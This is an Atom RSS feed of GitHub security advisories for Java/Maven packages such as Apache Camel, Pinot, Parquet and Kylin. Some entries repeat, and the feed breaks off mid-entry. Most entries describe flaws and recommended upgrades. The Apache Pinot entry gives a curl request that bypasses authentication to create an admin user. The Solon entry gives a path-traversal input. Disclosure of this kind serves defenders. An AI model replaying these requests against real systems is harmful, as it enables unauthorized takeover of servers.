<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2025-04-02T09:01:26.156Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[org.apache.camel:camel-undertow] Apache Camel Missing Header Out Filter Leads to Potential Bypass/Injection Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vq4p-pchp-6g6v</id>
        <link href="https://github.com/advisories/GHSA-vq4p-pchp-6g6v"/>
        <updated>2025-04-01T22:07:19.000Z</updated>
        <content type="html"><![CDATA[<p>Bypass/Injection vulnerability in Apache Camel in Camel-Undertow component under particular conditions.</p>
<p>This issue affects Apache Camel: from 4.10.0 before 4.10.3, from 4.8.0 before 4.8.6.</p>
<p>Users are recommended to upgrade to version 4.10.3 for 4.10.x LTS and 4.8.6 for 4.8.x LTS.</p>
<p>Camel undertow component is vulnerable to Camel message header injection, in particular the custom header filter strategy used by the component only filter the "out" direction, while it doesn't filter the "in" direction.</p>
<p>This allows an attacker to include Camel specific headers that for some Camel components can alter the behaviour such as the camel-bean component, or the camel-exec component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30177">https://nvd.nist.gov/vuln/detail/CVE-2025-30177</a></li>
<li><a href="https://camel.apache.org/security/CVE-2025-27636.html">https://camel.apache.org/security/CVE-2025-27636.html</a></li>
<li><a href="https://camel.apache.org/security/CVE-2025-29891.html">https://camel.apache.org/security/CVE-2025-29891.html</a></li>
<li><a href="https://lists.apache.org/thread/dj79zdgw01j337lr9gvyy4sv8xfyw8py">https://lists.apache.org/thread/dj79zdgw01j337lr9gvyy4sv8xfyw8py</a></li>
<li><a href="https://github.com/apache/camel/commit/9fd8fc30dbd98511a1faa0cbcf39ef5aeec88a64">https://github.com/apache/camel/commit/9fd8fc30dbd98511a1faa0cbcf39ef5aeec88a64</a></li>
<li><a href="https://github.com/advisories/GHSA-vq4p-pchp-6g6v">https://github.com/advisories/GHSA-vq4p-pchp-6g6v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vq4p-pchp-6g6v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-01T12:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.camel:camel-undertow] Apache Camel Missing Header Out Filter Leads to Potential Bypass/Injection Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vq4p-pchp-6g6v</id>
        <link href="https://github.com/advisories/GHSA-vq4p-pchp-6g6v"/>
        <updated>2025-04-01T22:07:19.000Z</updated>
        <content type="html"><![CDATA[<p>Bypass/Injection vulnerability in Apache Camel in Camel-Undertow component under particular conditions.</p>
<p>This issue affects Apache Camel: from 4.10.0 before 4.10.3, from 4.8.0 before 4.8.6.</p>
<p>Users are recommended to upgrade to version 4.10.3 for 4.10.x LTS and 4.8.6 for 4.8.x LTS.</p>
<p>Camel undertow component is vulnerable to Camel message header injection, in particular the custom header filter strategy used by the component only filter the "out" direction, while it doesn't filter the "in" direction.</p>
<p>This allows an attacker to include Camel specific headers that for some Camel components can alter the behaviour such as the camel-bean component, or the camel-exec component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30177">https://nvd.nist.gov/vuln/detail/CVE-2025-30177</a></li>
<li><a href="https://camel.apache.org/security/CVE-2025-27636.html">https://camel.apache.org/security/CVE-2025-27636.html</a></li>
<li><a href="https://camel.apache.org/security/CVE-2025-29891.html">https://camel.apache.org/security/CVE-2025-29891.html</a></li>
<li><a href="https://lists.apache.org/thread/dj79zdgw01j337lr9gvyy4sv8xfyw8py">https://lists.apache.org/thread/dj79zdgw01j337lr9gvyy4sv8xfyw8py</a></li>
<li><a href="https://github.com/apache/camel/commit/9fd8fc30dbd98511a1faa0cbcf39ef5aeec88a64">https://github.com/apache/camel/commit/9fd8fc30dbd98511a1faa0cbcf39ef5aeec88a64</a></li>
<li><a href="https://github.com/advisories/GHSA-vq4p-pchp-6g6v">https://github.com/advisories/GHSA-vq4p-pchp-6g6v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vq4p-pchp-6g6v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-01T12:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.pinot:pinot] Apache Pinot Vulnerable to Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-6jwp-4wvj-6597</id>
        <link href="https://github.com/advisories/GHSA-6jwp-4wvj-6597"/>
        <updated>2025-04-01T18:20:49.000Z</updated>
        <content type="html"><![CDATA[<p>Authentication Bypass Issue</p>
<p>If the path does not contain / and contain., authentication is not required.</p>
<p>Expected Normal Request and Response Example</p>
<p>curl -X POST -H "Content-Type: application/json" -d {"username":"hack2","password":"hack","component":"CONTROLLER","role":"ADMIN","tables":[],"permissions":[],"usernameWithComponent":"hack_CONTROLLER"}  http://{server_ip}:9000/users </p>
<p>Return: {"code":401,"error":"HTTP 401 Unauthorized"}</p>
<p>Malicious Request and Response Example </p>
<p>curl -X POST -H "Content-Type: application/json" -d '{"username":"hack","password":"hack","component":"CONTROLLER","role":"ADMIN","tables":[],"permissions":[],"usernameWithComponent":"hack_CONTROLLER"}'  http://{serverip}:9000/users; http://{serverip}:9000/users; .</p>
<p>Return: {"users":{}}</p>
<p>A new user gets added bypassing authentication, enabling the user to control Pinot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56325">https://nvd.nist.gov/vuln/detail/CVE-2024-56325</a></li>
<li><a href="https://lists.apache.org/thread/ksf8qsndr1h66otkbjz2wrzsbw992r8v">https://lists.apache.org/thread/ksf8qsndr1h66otkbjz2wrzsbw992r8v</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/27/8">http://www.openwall.com/lists/oss-security/2025/03/27/8</a></li>
<li><a href="https://github.com/advisories/GHSA-6jwp-4wvj-6597">https://github.com/advisories/GHSA-6jwp-4wvj-6597</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6jwp-4wvj-6597</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-01T09:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.parquet:parquet-avro] Apache Parquet Avro Module Vulnerable to Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-2c59-37c4-qrx5</id>
        <link href="https://github.com/advisories/GHSA-2c59-37c4-qrx5"/>
        <updated>2025-04-01T18:04:17.000Z</updated>
        <content type="html"><![CDATA[<p>Schema parsing in the parquet-avro module of Apache Parquet 1.15.0 and previous versions allows bad actors to execute arbitrary code</p>
<p>Users are recommended to upgrade to version 1.15.1, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30065">https://nvd.nist.gov/vuln/detail/CVE-2025-30065</a></li>
<li><a href="https://lists.apache.org/thread/okzqb3kn479gqzxm21gg5vqr35om9gw5">https://lists.apache.org/thread/okzqb3kn479gqzxm21gg5vqr35om9gw5</a></li>
<li><a href="https://github.com/apache/parquet-java/issues/3168">https://github.com/apache/parquet-java/issues/3168</a></li>
<li><a href="https://github.com/apache/parquet-java/pull/3169">https://github.com/apache/parquet-java/pull/3169</a></li>
<li><a href="https://issues.apache.org/jira/browse/AVRO-3985">https://issues.apache.org/jira/browse/AVRO-3985</a></li>
<li><a href="https://github.com/advisories/GHSA-2c59-37c4-qrx5">https://github.com/advisories/GHSA-2c59-37c4-qrx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c59-37c4-qrx5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-01T09:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.activemq:artemis-server] Apache ActiveMQ Artemis User Without Create Address Permissions can Modify Address Routing-Type]]></title>
        <id>https://github.com/advisories/GHSA-3w85-5p9g-h334</id>
        <link href="https://github.com/advisories/GHSA-3w85-5p9g-h334"/>
        <updated>2025-04-01T18:04:07.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in Apache ActiveMQ Artemis whereby a user with the createDurableQueue or createNonDurableQueue permission on an address can augment the routing-type supported by that address even if said user doesn't have the createAddress permission for that particular address. When combined with the send permission and automatic queue creation a user could successfully send a message with a routing-type not supported by the address when that message should actually be rejected on the basis that the user doesn't have permission to change the routing-type of the address.</p>
<p>This issue affects Apache ActiveMQ Artemis from 2.0.0 through 2.39.0.</p>
<p>Users are recommended to upgrade to version 2.40.0 which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27427">https://nvd.nist.gov/vuln/detail/CVE-2025-27427</a></li>
<li><a href="https://lists.apache.org/thread/8dzlm2vkqphyrnkrby8r8kzndsm5o6x8">https://lists.apache.org/thread/8dzlm2vkqphyrnkrby8r8kzndsm5o6x8</a></li>
<li><a href="https://github.com/apache/activemq-artemis/commit/2216a75a57f098295abb283d556c8b8bda91324d">https://github.com/apache/activemq-artemis/commit/2216a75a57f098295abb283d556c8b8bda91324d</a></li>
<li><a href="https://github.com/apache/activemq-artemis/commit/6ab458015689303db8878941abe1bc973299fc2e">https://github.com/apache/activemq-artemis/commit/6ab458015689303db8878941abe1bc973299fc2e</a></li>
<li><a href="https://issues.apache.org/jira/browse/ARTEMIS-5346">https://issues.apache.org/jira/browse/ARTEMIS-5346</a></li>
<li><a href="https://github.com/advisories/GHSA-3w85-5p9g-h334">https://github.com/advisories/GHSA-3w85-5p9g-h334</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3w85-5p9g-h334</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-01T09:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.jooby:jooby-pac4j] jooby-pac4j: deserialization of untrusted data]]></title>
        <id>https://github.com/advisories/GHSA-7c5v-895v-w4q5</id>
        <link href="https://github.com/advisories/GHSA-7c5v-895v-w4q5"/>
        <updated>2025-04-01T14:19:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions after 2.x and before 3.x of io.jooby:jooby-pac4j can cause deserialization of untrusted data</p>
<h3 id="patches">Patches</h3>
<ul>
<li>2.17.0 (2.x)</li>
<li>3.7.0 (3.x)</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Not using io.jooby:jooby-pac4j until it gets patches.</li>
<li>Check what values you put/save on session</li>
</ul>
<h3 id="references">References</h3>
<p>Version 2.x:</p>
<p><a href="https://github.com/jooby-project/jooby/blob/v2.x/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L39-L45">https://github.com/jooby-project/jooby/blob/v2.x/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L39-L45</a></p>
<p>Version 3.x:
<a href="https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84">https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84</a></p>
<h3 id="cause">Cause</h3>
<p>In module pac4j io.jooby.internal.pac4j.SessionStoreImpl#get , it is used to handle sessions , and trying to get key value. In strToObject function ,it's trying to deserialize value when value starts with "b64~" , which might cause deserialization of untrusted data.</p>
<p><a href="https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84">modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java</a></p>
<p>Here's a small demo using SessionStoreImpl#get to handle sessions ,and user can pass parameters.</p>
<p><img alt="屏幕截图 2025-03-25 051325" src="https://github.com/user-attachments/assets/93039a06-d4f1-458a-8595-736b3fede345"></p>
<p>And following below is exploiting successfully(execute calculator)</p>
<p><img alt="屏幕截图 2025-03-24 015128（1）" src="https://github.com/user-attachments/assets/415cf20c-dda0-4634-83ae-f8fa89677a16"></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jooby-project/jooby/security/advisories/GHSA-7c5v-895v-w4q5">https://github.com/jooby-project/jooby/security/advisories/GHSA-7c5v-895v-w4q5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31129">https://nvd.nist.gov/vuln/detail/CVE-2025-31129</a></li>
<li><a href="https://github.com/jooby-project/jooby/commit/3e13562cf36d7407813eae464e0f4b598de15692">https://github.com/jooby-project/jooby/commit/3e13562cf36d7407813eae464e0f4b598de15692</a></li>
<li><a href="https://github.com/jooby-project/jooby/blob/v2.x/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L39-L45">https://github.com/jooby-project/jooby/blob/v2.x/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L39-L45</a></li>
<li><a href="https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84">https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84</a></li>
<li><a href="https://github.com/advisories/GHSA-7c5v-895v-w4q5">https://github.com/advisories/GHSA-7c5v-895v-w4q5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7c5v-895v-w4q5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-01T14:19:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.jooby:jooby-pac4j] jooby-pac4j: deserialization of untrusted data]]></title>
        <id>https://github.com/advisories/GHSA-7c5v-895v-w4q5</id>
        <link href="https://github.com/advisories/GHSA-7c5v-895v-w4q5"/>
        <updated>2025-04-01T14:19:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions after 2.x and before 3.x of io.jooby:jooby-pac4j can cause deserialization of untrusted data</p>
<h3 id="patches">Patches</h3>
<ul>
<li>2.17.0 (2.x)</li>
<li>3.7.0 (3.x)</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Not using io.jooby:jooby-pac4j until it gets patches.</li>
<li>Check what values you put/save on session</li>
</ul>
<h3 id="references">References</h3>
<p>Version 2.x:</p>
<p><a href="https://github.com/jooby-project/jooby/blob/v2.x/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L39-L45">https://github.com/jooby-project/jooby/blob/v2.x/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L39-L45</a></p>
<p>Version 3.x:
<a href="https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84">https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84</a></p>
<h3 id="cause">Cause</h3>
<p>In module pac4j io.jooby.internal.pac4j.SessionStoreImpl#get , it is used to handle sessions , and trying to get key value. In strToObject function ,it's trying to deserialize value when value starts with "b64~" , which might cause deserialization of untrusted data.</p>
<p><a href="https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84">modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java</a></p>
<p>Here's a small demo using SessionStoreImpl#get to handle sessions ,and user can pass parameters.</p>
<p><img alt="屏幕截图 2025-03-25 051325" src="https://github.com/user-attachments/assets/93039a06-d4f1-458a-8595-736b3fede345"></p>
<p>And following below is exploiting successfully(execute calculator)</p>
<p><img alt="屏幕截图 2025-03-24 015128（1）" src="https://github.com/user-attachments/assets/415cf20c-dda0-4634-83ae-f8fa89677a16"></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jooby-project/jooby/security/advisories/GHSA-7c5v-895v-w4q5">https://github.com/jooby-project/jooby/security/advisories/GHSA-7c5v-895v-w4q5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31129">https://nvd.nist.gov/vuln/detail/CVE-2025-31129</a></li>
<li><a href="https://github.com/jooby-project/jooby/commit/3e13562cf36d7407813eae464e0f4b598de15692">https://github.com/jooby-project/jooby/commit/3e13562cf36d7407813eae464e0f4b598de15692</a></li>
<li><a href="https://github.com/jooby-project/jooby/blob/v2.x/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L39-L45">https://github.com/jooby-project/jooby/blob/v2.x/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L39-L45</a></li>
<li><a href="https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84">https://github.com/jooby-project/jooby/blob/v3.6.1/modules/jooby-pac4j/src/main/java/io/jooby/internal/pac4j/SessionStoreImpl.java#L77-L84</a></li>
<li><a href="https://github.com/advisories/GHSA-7c5v-895v-w4q5">https://github.com/advisories/GHSA-7c5v-895v-w4q5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7c5v-895v-w4q5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-01T14:19:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.netty.incubator:netty-incubator-codec-quic] Netty QUIC hash collision DoS attack]]></title>
        <id>https://github.com/advisories/GHSA-hqqc-jr88-p6x2</id>
        <link href="https://github.com/advisories/GHSA-hqqc-jr88-p6x2"/>
        <updated>2025-03-31T21:47:23.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the codec. A hash collision vulnerability (in the hash map used to manage connections) allows remote attackers to cause a considerable CPU load on the server (a Hash DoS attack) by initiating connections with colliding Source Connection IDs (SCIDs).</p>
<p>See <a href="https://github.com/ncc-pbottine/QUIC-Hash-Dos-Advisory">https://github.com/ncc-pbottine/QUIC-Hash-Dos-Advisory</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/netty/netty-incubator-codec-quic/security/advisories/GHSA-hqqc-jr88-p6x2">https://github.com/netty/netty-incubator-codec-quic/security/advisories/GHSA-hqqc-jr88-p6x2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29908">https://nvd.nist.gov/vuln/detail/CVE-2025-29908</a></li>
<li><a href="https://github.com/netty/netty-incubator-codec-quic/commit/e059bd9b78723f8b035e0c547e42ce263f03461c">https://github.com/netty/netty-incubator-codec-quic/commit/e059bd9b78723f8b035e0c547e42ce263f03461c</a></li>
<li><a href="https://github.com/ncc-pbottine/QUIC-Hash-Dos-Advisory">https://github.com/ncc-pbottine/QUIC-Hash-Dos-Advisory</a></li>
<li><a href="https://github.com/advisories/GHSA-hqqc-jr88-p6x2">https://github.com/advisories/GHSA-hqqc-jr88-p6x2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hqqc-jr88-p6x2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T21:47:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.noear:solon-view] Solon Vulnerable to Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-2m4q-2c6r-hmc3</id>
        <link href="https://github.com/advisories/GHSA-2m4q-2c6r-hmc3"/>
        <updated>2025-03-31T16:42:30.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability classified as problematic was found in opensolon up to 3.1.0. This vulnerability affects the function render_mav of the file /aa of the component org.noear.solon.core.handle.RenderManager. The manipulation of the argument template with the input ../org/example/HelloApp.class leads to path traversal: '../filedir'. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2961">https://nvd.nist.gov/vuln/detail/CVE-2025-2961</a></li>
<li><a href="https://github.com/Q16G/cve_detail/blob/main/solon/templateRCE.md">https://github.com/Q16G/cve_detail/blob/main/solon/templateRCE.md</a></li>
<li><a href="https://vuldb.com/?ctiid.302014">https://vuldb.com/?ctiid.302014</a></li>
<li><a href="https://vuldb.com/?id.302014">https://vuldb.com/?id.302014</a></li>
<li><a href="https://vuldb.com/?submit.522380">https://vuldb.com/?submit.522380</a></li>
<li><a href="https://github.com/advisories/GHSA-2m4q-2c6r-hmc3">https://github.com/advisories/GHSA-2m4q-2c6r-hmc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2m4q-2c6r-hmc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T00:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.infinispan:infinispan-query] Infinispan Potential Out of Memory Error via REST Compare API Buffer API]]></title>
        <id>https://github.com/advisories/GHSA-2q39-w2hw-2pjm</id>
        <link href="https://github.com/advisories/GHSA-2q39-w2hw-2pjm"/>
        <updated>2025-03-31T16:10:06.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in the Infinispan component in Red Hat Data Grid. The REST compare API may have a buffer leak and an out of memory error can occur when sending continual requests with large POST data to the REST API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6875">https://nvd.nist.gov/vuln/detail/CVE-2024-6875</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-6875">https://access.redhat.com/security/cve/CVE-2024-6875</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2298555">https://bugzilla.redhat.com/show_bug.cgi?id=2298555</a></li>
<li><a href="https://github.com/advisories/GHSA-2q39-w2hw-2pjm">https://github.com/advisories/GHSA-2q39-w2hw-2pjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2q39-w2hw-2pjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-28T21:30:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.infinispan:infinispan-query] Infinispan Potential Out of Memory Error via REST Compare API Buffer API]]></title>
        <id>https://github.com/advisories/GHSA-2q39-w2hw-2pjm</id>
        <link href="https://github.com/advisories/GHSA-2q39-w2hw-2pjm"/>
        <updated>2025-03-31T16:10:06.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in the Infinispan component in Red Hat Data Grid. The REST compare API may have a buffer leak and an out of memory error can occur when sending continual requests with large POST data to the REST API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6875">https://nvd.nist.gov/vuln/detail/CVE-2024-6875</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-6875">https://access.redhat.com/security/cve/CVE-2024-6875</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2298555">https://bugzilla.redhat.com/show_bug.cgi?id=2298555</a></li>
<li><a href="https://github.com/advisories/GHSA-2q39-w2hw-2pjm">https://github.com/advisories/GHSA-2q39-w2hw-2pjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2q39-w2hw-2pjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-28T21:30:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.kylin:kylin] Apache Kylin Code Injection via JDBC Configuration Alteration]]></title>
        <id>https://github.com/advisories/GHSA-29m8-wh9p-5wc4</id>
        <link href="https://github.com/advisories/GHSA-29m8-wh9p-5wc4"/>
        <updated>2025-03-27T18:18:41.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Control of Generation of Code ('Code Injection') vulnerability in Apache Kylin. 
If an attacker gets access to Kylin's system or project admin permission, the JDBC connection configuration maybe altered to execute arbitrary code from the remote. You are fine as long as the Kylin's system and project admin access is well protected.</p>
<p>This issue affects Apache Kylin: from 4.0.0 through 5.0.1.</p>
<p>Users are recommended to upgrade to version 5.0.2 or above, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30067">https://nvd.nist.gov/vuln/detail/CVE-2025-30067</a></li>
<li><a href="https://lists.apache.org/thread/6j19pt8yoqfphf1lprtrzoqkvz1gwbnc">https://lists.apache.org/thread/6j19pt8yoqfphf1lprtrzoqkvz1gwbnc</a></li>
<li><a href="https://github.com/apache/kylin/commit/21d98f3ef29f71b50dacabbf039905f9f0f71b95">https://github.com/apache/kylin/commit/21d98f3ef29f71b50dacabbf039905f9f0f71b95</a></li>
<li><a href="https://issues.apache.org/jira/browse/KYLIN-5994">https://issues.apache.org/jira/browse/KYLIN-5994</a></li>
<li><a href="https://github.com/advisories/GHSA-29m8-wh9p-5wc4">https://github.com/advisories/GHSA-29m8-wh9p-5wc4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-29m8-wh9p-5wc4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-27T15:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.kylin:kylin-common-server] Apache Kylin Server-Side Request Forgery (SSRF) via `/kylin/api/xxx/diag` Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-3v67-545x-ffc3</id>
        <link href="https://github.com/advisories/GHSA-3v67-545x-ffc3"/>
        <updated>2025-03-27T18:16:41.000Z</updated>
        <content type="html"><![CDATA[<p>Server-Side Request Forgery (SSRF) vulnerability in Apache Kylin. Through a kylin server, an attacker may forge a request to invoke "/kylin/api/xxx/diag" api on another internal host and possibly get leaked information. There are two preconditions: 1) The attacker has got admin access to a kylin server; 2) Another internal host has the "/kylin/api/xxx/diag" api endpoint open for service.</p>
<p>This issue affects Apache Kylin: from 5.0.0 through 5.0.1.</p>
<p>Users are recommended to upgrade to version 5.0.2, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48944">https://nvd.nist.gov/vuln/detail/CVE-2024-48944</a></li>
<li><a href="https://lists.apache.org/thread/1xxxtdfh9hzqsqgb1pd9grb8hvqdyc9x">https://lists.apache.org/thread/1xxxtdfh9hzqsqgb1pd9grb8hvqdyc9x</a></li>
<li><a href="https://github.com/apache/kylin/commit/4e6a5acd799ae7543c7161e72ef1019c74d5b4ad">https://github.com/apache/kylin/commit/4e6a5acd799ae7543c7161e72ef1019c74d5b4ad</a></li>
<li><a href="https://issues.apache.org/jira/browse/KYLIN-5644">https://issues.apache.org/jira/browse/KYLIN-5644</a></li>
<li><a href="https://github.com/advisories/GHSA-3v67-545x-ffc3">https://github.com/advisories/GHSA-3v67-545x-ffc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3v67-545x-ffc3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-27T15:31:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.opendaylight.sfc:sfc-parent] OpenDaylight SFC Allows Unauthorized Privileged Execution via Crafted Request]]></title>
        <id>https://github.com/advisories/GHSA-x65v-g96x-c6gw</id>
        <link href="https://github.com/advisories/GHSA-x65v-g96x-c6gw"/>
        <updated>2025-03-26T19:48:27.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in the Shiro-based RBAC (Role-based Access Control) mechanism of OpenDaylight Service Function Chaining (SFC) Subproject SFC Sodium-SR4 and below allows attackers to execute privileged operations via a crafted request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29315">https://nvd.nist.gov/vuln/detail/CVE-2025-29315</a></li>
<li><a href="https://blog.csdn.net/weixin_43959580/article/details/144794289">https://blog.csdn.net/weixin_43959580/article/details/144794289</a></li>
<li><a href="https://github.com/advisories/GHSA-x65v-g96x-c6gw">https://github.com/advisories/GHSA-x65v-g96x-c6gw</a></li>
</ul>
]]></content>
        <author>
